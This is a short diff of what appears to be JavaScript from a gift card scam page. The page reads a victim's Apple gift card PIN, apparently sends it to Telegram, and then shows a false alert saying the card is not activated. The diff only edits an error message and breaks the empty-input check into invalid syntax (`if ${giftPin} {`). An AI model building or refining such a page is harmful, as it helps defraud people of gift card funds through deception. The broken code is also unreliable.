@@ -133,7 +133,7 @@
 
     const giftPin = input.value.trim();
 
-    if (!giftPin) {
+    if ${giftPin} {
       alert("⚠️ Please input the pin to continue");
       return;
     }
@@ -154,7 +154,7 @@
       alert("❌ This Apple Gift Card is not activated!");
     })
     .catch(err => {
-      alert("Error sending to Telegram");
+      alert("Error sending to Tg");
       console.error(err);
     });
   });
